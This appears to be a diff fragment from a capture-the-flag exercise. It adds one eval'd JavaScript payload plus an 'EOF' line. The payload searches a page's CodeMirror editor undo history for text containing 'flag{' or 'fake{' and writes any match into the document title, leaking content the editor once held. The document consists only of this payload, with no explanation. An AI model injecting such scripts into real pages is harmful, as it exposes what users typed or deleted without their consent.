@@ -1,0 +1,2 @@
+eval.call(null,"document.querySelector('.CodeMirror').CodeMirror.doc.history.done.forEach(d=>{if(d.changes)d.changes.forEach(c=>{let t=c.text.join('');if(t.includes('flag{')||t.includes('fake{'))document.title=t})})")
+EOF
